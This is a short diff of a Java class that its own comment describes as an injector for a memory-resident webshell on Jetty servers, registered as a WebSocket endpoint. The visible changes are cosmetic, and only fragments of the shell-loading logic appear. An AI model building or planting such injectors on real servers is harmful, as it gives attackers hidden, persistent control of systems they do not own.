@@ -11,14 +11,14 @@ import java.util.zip.GZIPInputStream;
 /**
  * Jetty WebSocket 内存马注入器。
  * <p>
- * tested v8, v9, v10 (ee8-ee10)
+ * 覆盖 Jetty 8、9、10（ee8-ee10）。
  * <p>
  * Context 发现逻辑复用 {@link JettyFilterInjector}，通过 ServletContext
  * 获取 ServerContainer 并 addEndpoint。
  */
 public class JettyWebSocketInjector {
 
-    private static boolean ok = false;
+    private static boolean ok;
     private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
@@ -92,7 +92,7 @@ public class JettyWebSocketInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
